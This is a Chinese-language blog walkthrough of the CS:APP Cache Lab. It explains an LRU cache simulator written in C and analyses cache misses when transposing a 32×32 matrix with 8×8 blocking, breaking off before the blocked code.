<h1 id="Part-A-Writing-a-Cache-Simulator"><a href="#Part-A-Writing-a-Cache-Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h1><p>Part A 要求在<code>csim.c</code>下编写一个高速缓存模拟器来对内存读写操作进行正确的反馈。这个模拟器有 6 个参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</span><br><span class="line">	• -h: Optional help flag that prints usage info</span><br><span class="line">	• -v: Optional verbose flag that displays trace info</span><br><span class="line">	• -s &lt;s&gt;: Number of <span class="built_in">set</span> index <span class="title function_">bits</span> <span class="params">(S = <span class="number">2</span>s is the number of sets)</span></span><br><span class="line">	• -E &lt;E&gt;: <span class="title function_">Associativity</span> <span class="params">(number of lines per <span class="built_in">set</span>)</span></span><br><span class="line">	• -b &lt;b&gt;: Number of block <span class="title function_">bits</span> <span class="params">(B = <span class="number">2b</span> is the block size)</span></span><br><span class="line">	• -t &lt;tracefile&gt;: Name of the valgrind trace to replay</span><br></pre></td></tr></table></figure>

<p>其中，输入的 trace 的格式为：<code>[space]operation address, size</code>，operation 有 4 种：</p>
<ul>
<li><code>I</code>表示加载指令</li>
<li><code>L</code> 加载数据</li>
<li><code>S</code>存储数据</li>
<li><code>M</code> 修改数据</li>
</ul>
<p>模拟器不需要考虑加载指令，而<code>M</code>指令就相当于先进行<code>L</code>再进行<code>S</code>，因此，要考虑的情况其实并不多。模拟器要做出的反馈有 3 种：</p>
<ul>
<li><code>hit</code>：命中，表示要操作的数据在对应组的其中一行</li>
<li><code>miss</code>：不命中，表示要操作的数据不在对应组的任何一行</li>
<li><code>eviction</code>：驱赶，表示要操作的数据的对应组已满，进行了替换操作</li>
</ul>
<h2 id="回顾：Cache-结构"><a href="#回顾：Cache-结构" class="headerlink" title="回顾：Cache 结构"></a>回顾：Cache 结构</h2><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220320192922277.png" alt="image-20220320192922277"></p>
<p>Cache 类似于一个二维数组，它有$S&#x3D;2^s$组，每组有 E 行，每行存储的字节也是固定的。其中，每行都有一个有效位，和一个标记位。想要查找到对应的字节，我们的地址需要三部分组成：</p>
<ul>
<li>s，索引位，找到对应的组序号</li>
<li>tag，标记位，在组中的每一行进行匹配，判断能否命中</li>
<li>b，块偏移，表明在找到的行中的具体位置。本实验不考虑块便宜，完全可以忽略。</li>
</ul>
<p>那么，Cache 中的有效位是干什么的呢？判断该行是否为空。这里有一个概念：<strong>冷不命中</strong>，表示该缓存块为空造成的不命中。而一旦确定不命中不是冷不命中，那么就需要考虑行替换的问题了。我认为，行替换关乎着 Cache 的效率，是 Cache 设计的核心。</p>
<h2 id="回顾：替换策略"><a href="#回顾：替换策略" class="headerlink" title="回顾：替换策略"></a>回顾：替换策略</h2><p>当 CPU 要处理的字不在组中任何一行，且组中没有一个空行，那就必须从里面选取一个非空行进行替换。选取哪个空行进行替换呢？书上给了我们两种策略：</p>
<ul>
<li>LFU，最不常使用策略。替换在过去某个窗口时间内引用次数最少的那一行</li>
<li>LRU，最近最少使用策略。替换最后一次访问时间最久远的哪一行</li>
</ul>
<p>本实验要求采取的策略为 <strong>LRU</strong>。</p>
<p>那么代码如何实现呢？我的第一反应是实现 S 个双向链表，每个链表有 E 个结点，对应于组中的每一行，每当访问了其中的一行，就把这个结点移动到链表的头部，后续替换的时候只需要选择链尾的结点就好了。但是，为了简单，我还是选择了 PPT 中提示的相对简单的设置<strong>时间戳</strong>的办法，双向链表以后有时间再写吧。</p>
<p>下面就可以正式开始 Part A 了！我对我写的模拟器的核心部分进行讲解。</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>定义了<code>Cache</code>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> S;</span><br><span class="line">    <span class="type">int</span> E;</span><br><span class="line">    <span class="type">int</span> B;</span><br><span class="line">    Cache_line **line;</span><br><span class="line">&#125; Cache;</span><br></pre></td></tr></table></figure>

<p>用<code>Cache</code>表示一个缓存，它包括 S, B, E 等特征，以及前面说过的，每一个缓存类似于一个二位数组，数组的每一个元素就是缓存中的行所以用一个<code>line</code>来表示这一信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_line</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> valid;     <span class="comment">//有效位</span></span><br><span class="line">    <span class="type">int</span> tag;       <span class="comment">//标记位</span></span><br><span class="line">    <span class="type">int</span> time_tamp; <span class="comment">//时间戳</span></span><br><span class="line">&#125; Cache_line;</span><br></pre></td></tr></table></figure>

<p><code>valid</code>以及<code>tag</code>不再赘述，这里的<code>time_tamp</code>表示时间戳，是 LRU 策略需要用到的特征。Cache 初始值设置如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Init_Cache</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> E, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">    <span class="type">int</span> B = <span class="number">1</span> &lt;&lt; b;</span><br><span class="line">    cache = (Cache *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Cache));</span><br><span class="line">    cache-&gt;S = S;</span><br><span class="line">    cache-&gt;E = E;</span><br><span class="line">    cache-&gt;B = B;</span><br><span class="line">    cache-&gt;line = (Cache_line **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Cache_line *) * S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cache-&gt;line[i] = (Cache_line *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Cache_line) * E);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cache-&gt;line[i][j].valid = <span class="number">0</span>; <span class="comment">//初始时，高速缓存是空的</span></span><br><span class="line">            cache-&gt;line[i][j].tag = <span class="number">-1</span>;</span><br><span class="line">            cache-&gt;line[i][j].time_tamp = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，时间戳初始设置为0。</p>
<h2 id="LRU-时间戳实现"><a href="#LRU-时间戳实现" class="headerlink" title="LRU 时间戳实现"></a>LRU 时间戳实现</h2><p>我的逻辑是时间戳越大则表示该行最后访问的时间越久远。先看 LRU 更新的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> op_s, <span class="type">int</span> op_tag)</span>&#123;</span><br><span class="line">    cache-&gt;line[op_s][i].valid=<span class="number">1</span>;</span><br><span class="line">    cache-&gt;line[op_s][i].tag = op_tag;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; cache-&gt;E; k++)</span><br><span class="line">        <span class="keyword">if</span>(cache-&gt;line[op_s][k].valid==<span class="number">1</span>)</span><br><span class="line">            cache-&gt;line[op_s][k].time_tamp++;</span><br><span class="line">    cache-&gt;line[op_s][i].time_tamp = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码在找到要进行的操作行后调用（无论是不命中还是命中，还是驱逐后）。前两行是对有效位和标志位的设置，与时间戳无关，主要关注后几行：</p>
<ul>
<li>遍历组中每一行，并将它们的值加1，也就是说每一行在进行一次操作后时间戳都会变大，表示它离最后操作的时间变久</li>
<li>将本次操作的行时间戳设置为最小，也就是0</li>
</ul>
<p>由此，每次只需要找到时间戳最大的行进行替换就可以了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">find_LRU</span><span class="params">(<span class="type">int</span> op_s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> max_index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max_stamp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(cache-&gt;line[op_s][i].time_tamp &gt; max_stamp)&#123;</span><br><span class="line">            max_stamp = cache-&gt;line[op_s][i].time_tamp;</span><br><span class="line">            max_index = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="缓存搜索及更新"><a href="#缓存搜索及更新" class="headerlink" title="缓存搜索及更新"></a>缓存搜索及更新</h2><p>先解决比较核心的问题，在得知要操作的组<code>op_s</code>以及标志位<code>op_tag</code>后，判断是<code>miss</code>还是<code>hit</code>还是应该<code>eviction</code>调用<code>find_LRU</code>。</p>
<p>先判断是<code>miss</code>还是<code>hit</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_index</span><span class="params">(<span class="type">int</span> op_s, <span class="type">int</span> op_tag)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;line[op_s][i].valid &amp;&amp; cache-&gt;line[op_s][i].tag == op_tag)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遍历所有行，如果某一行有效，且标志位相同，则<code>hit</code>，返回该索引。否则，<code>miss</code>，返回 -1。当接收到-1后，有两种情况：</p>
<ul>
<li>冷不命中。组中有空行，只不过还未操作过，有效位为0，找到这个空行即可</li>
<li>所有行都满了。那么就要用到上面得 LRU 进行选择驱逐</li>
</ul>
<p>所以，设计一个判满的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">is_full</span><span class="params">(<span class="type">int</span> op_s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;line[op_s][i].valid == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>扫描完成后，得到对应行的索引值，就可以调用 LRU 更新函数进行更新了。整体调用如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">update_info</span><span class="params">(<span class="type">int</span> op_tag, <span class="type">int</span> op_s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> index = get_index(op_s, op_tag);</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        miss_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbose)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">        <span class="type">int</span> i = is_full(op_s);</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">-1</span>)&#123;</span><br><span class="line">            eviction_count++;</span><br><span class="line">            <span class="keyword">if</span>(verbose) <span class="built_in">printf</span>(<span class="string">&quot;eviction&quot;</span>);</span><br><span class="line">            i = find_LRU(op_s);</span><br><span class="line">        &#125;</span><br><span class="line">        update(i,op_s,op_tag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        hit_count++;</span><br><span class="line">        <span class="keyword">if</span>(verbose)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit&quot;</span>);</span><br><span class="line">        update(index,op_s,op_tag);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，Part A 的核心部分函数就编写完了，下面的内容属于是技巧性的部分，与架构无关。</p>
<h2 id="指令解析"><a href="#指令解析" class="headerlink" title="指令解析"></a>指令解析</h2><p>设计的数据结构解决了对 Cache 的操作问题，LRU 时间戳的实现解决了核心的驱逐问题，缓存扫描解决了对块中哪一列进行操作的问题，而应该对哪一块进行操作呢？接下来要解决的就是指令的解析问题了。</p>
<p>输入数据为<code>[space]operation address, size</code>的形式，<code>operation</code>很容易获取，重要的是从<code>address</code>中分别获取我们需要的<code>s</code>和<code>tag</code>，<code>address</code>结构如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220320211615190.png" alt="image-20220320211615190"></p>
<p>这就用到了第二章以及<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/472188244">Data Lab</a>的知识。tag 很容易得到，右移 (b + s) 位即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> op_tag = address &gt;&gt; (s + b);</span><br></pre></td></tr></table></figure>

<p>获取 s，考虑先右移 b 位，再用无符号 0xFF… 右移后进行与操作将 tag 抹去。为什么要用无符号 0xFF… 右移呢？因为C语言中的右移为算术右移，有符号数右移补位的数为符号位。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> op_s = (address &gt;&gt; b) &amp; ((<span class="type">unsigned</span>)(<span class="number">-1</span>) &gt;&gt; (<span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>) - s));</span><br></pre></td></tr></table></figure>

<p>由于数据读写对于本模拟器而言是没有区别的，因此不同的指令对应的只是 Cache 更新次数的问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_trace</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> E, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *pFile;</span><br><span class="line">    pFile = fopen(t, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> identifier;</span><br><span class="line">    <span class="type">unsigned</span> address;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="comment">// Reading lines like &quot; M 20,1&quot; or &quot;L 19,3&quot;</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(pFile, <span class="string">&quot; %c %x,%d&quot;</span>, &amp;identifier, &amp;address, &amp;size) &gt; <span class="number">0</span>) <span class="comment">// I读不进来,忽略---size没啥用</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//想办法先得到标记位和组序号</span></span><br><span class="line">        <span class="type">int</span> op_tag = address &gt;&gt; (s + b);</span><br><span class="line">        <span class="type">int</span> op_s = (address &gt;&gt; b) &amp; ((<span class="type">unsigned</span>)(<span class="number">-1</span>) &gt;&gt; (<span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>) - s));</span><br><span class="line">        <span class="keyword">switch</span> (identifier)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="comment">//一次存储一次加载</span></span><br><span class="line">            update_info(op_tag, op_s);</span><br><span class="line">            update_info(op_tag, op_s);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            update_info(op_tag, op_s);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            update_info(op_tag, op_s);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(pFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>update_info</code>就是对 Cache 进行更新的函数，前面已经讲解。如果指令是<code>M</code>则一次存储一次加载，总共更新两次，其他指令只用更新一次，而<code>I</code>无需考虑。</p>
<h2 id="命令行参数获取"><a href="#命令行参数获取" class="headerlink" title="命令行参数获取"></a>命令行参数获取</h2><p>通过阅读<a target="_blank" rel="noopener" href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">Cache Lab Implementation and Blocking</a>的提示，我们使用<code>getopt()</code>函数来获取命令行参数的字符串形式，然后用<code>atoi()</code>转换为要用的参数，最后用<code>switch</code>语句跳转到对应功能块。</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> opt;</span><br><span class="line">    <span class="type">int</span> s, E, b;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * s:S=2^s是组的个数</span></span><br><span class="line"><span class="comment">     * E:每组中有多少行</span></span><br><span class="line"><span class="comment">     * b:B=2^b每个缓冲块的字节数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">-1</span> != (opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            print_help();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            E = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(t, optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            print_help();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Init_Cache(s, E, b); <span class="comment">//初始化一个cache</span></span><br><span class="line">    get_trace(s, E, b);</span><br><span class="line">    free_Cache();</span><br><span class="line">    <span class="comment">// printSummary(hit_count, miss_count, eviction_count)</span></span><br><span class="line">    printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整代码太长，可访问我的<code>Github</code>仓库查看：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Deconx/CSAPP-Lab">https://github.com/Deconx/CSAPP-Lab</a></p>
<h1 id="Part-B-Optimizing-Matrix-Transpose"><a href="#Part-B-Optimizing-Matrix-Transpose" class="headerlink" title="Part B: Optimizing Matrix Transpose"></a>Part B: Optimizing Matrix Transpose</h1><p>Part B 是在<code>trans.c</code>中编写矩阵转置的函数，在一个 s &#x3D; 5,  E &#x3D; 1,  b &#x3D; 5 的缓存中进行读写，使得 miss 的次数最少。测试矩阵的参数以及 miss 次数对应的分数如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220320223422026.png" alt="image-20220320223422026"></p>
<p>要求最多只能声明12个本地变量。</p>
<p>根据课本以及 PPT 的提示，这里肯定要使用<strong>矩阵分块</strong>进行优化</p>
<h2 id="32-×-32"><a href="#32-×-32" class="headerlink" title="32 × 32"></a>32 × 32</h2><p><strong>开始之前，我们先了解一下何为分块？为什么分块？</strong></p>
<p> s &#x3D; 5,  E &#x3D; 1,  b &#x3D; 5 的缓存有32组，每组一行，每行存 8 个<code>int</code>，如图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220320224801835.png" alt="image-20220320224801835"></p>
<p>就以这个缓存为例，考虑暴力转置的做法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trans_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">            <span class="type">int</span> tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们会按行优先读取 <code>A</code> 矩阵，然后一列一列地写入 <code>B</code> 矩阵。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220320230345066.png" alt="image-20220320230345066"></p>
<p>以第1行为例，在从内存读 <code>A[0][0]</code> 的时候，除了 <code>A[0][0]</code> 被加载到缓存中，它之后的 <code>A[0][1]---A[0][7]</code> 也会被加载进缓存。</p>
<p>但是内容写入 <code>B</code> 矩阵的时候是一列一列地写入，在列上相邻的元素不在一个内存块上，这样每次写入都不命中缓存。并且一列写完之后再返回，原来的缓存可能被覆盖了，这样就又会不命中。我们来定量分析。</p>
<p>缓存只够存储一个矩阵的四分之一，<code>A</code>中的元素对应的缓存行每隔8行就会重复。<code>A</code>和<code>B</code>的地址由于取余关系，每个元素对应的地址是相同的。各个元素对应缓存行如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220320232835429.png" alt="image-20220320232835429"></p>
<p>对于<code>A</code>，每8个<code>int</code>就会占满缓存的一组，所以每一行会有 32&#x2F;8 &#x3D; 4 次不命中；而对于<code>B</code>，考虑最坏情况，每一列都有 32 次不命中，由此，算出总不命中次数为 4 × 32 + 32 × 32 &#x3D; 1152。拿程序跑一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220321083600461.png" alt="image-20220321083600461"></p>
<p>结果为 1183 比预估多了一点，这是对角线部分两者冲突造成的，后面会讲到。</p>
<p><strong>回过头来，思考暴力做法：</strong></p>
<p><img src="/../../../Img/image-20220321084213463.png" alt="image-20220321084213463"></p>
<p>在写入<code>B</code>的前 8 行后，<code>B</code>的<code>D</code>区域就全部进入了缓存，此时如果能对<code>D</code>进行操作，那么就能利用上缓存的内容，不会<code>miss</code>；但是，暴力解法接下来操作的是<code>C</code>，每一个元素的写都要驱逐之前的缓存区，当来到第 2 列继续写<code>D</code>时，它对应的缓存行很可能已经被驱逐了，于是又要<code>miss</code>，也就是说，暴力解法的问题在于没有充分利用上已经进入缓存的元素。</p>
<p>分块解决的就是同一个矩阵内部缓存块相互替换的问题。</p>
<p>由上述分析，显然应考虑 8 × 8 分块，这样在块的内部不会冲突，接下来判断<code>A</code>与<code>B</code>之间会不会冲突</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220321090753034.png" alt="image-20220321090753034"></p>
<p><code>A</code>中标红的块占用的是缓存的第 0，4，8，12，16，20，24，28组，而<code>B</code>中标红的块占用的是缓存的第1，5，9，13，17，15，29组，刚好不会冲突。事实上，<strong>除了对角线</strong>，<code>A</code>与<code>B</code>中对应的块都不会冲突。所以，我们的想法是可行的，写出代码：</p>
